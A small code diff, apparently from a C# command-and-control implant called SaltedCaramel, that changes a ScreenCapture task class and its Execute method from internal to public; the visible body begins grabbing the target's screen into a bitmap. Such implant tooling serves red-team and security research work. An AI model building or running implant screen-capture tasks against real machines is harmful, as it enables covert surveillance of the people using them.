@@ -10,9 +10,9 @@ using System.Windows.Forms;
 /// </summary>
 namespace SaltedCaramel.Tasks
 {
-    internal class ScreenCapture
+    public class ScreenCapture
     {
-        internal static void Execute(SCTaskObject task, SCImplant implant)
+        public static void Execute(SCTaskObject task, SCImplant implant)
         {
             Rectangle bounds = Screen.GetBounds(Point.Empty);
             Bitmap bm = new Bitmap(bounds.Width, bounds.Height);
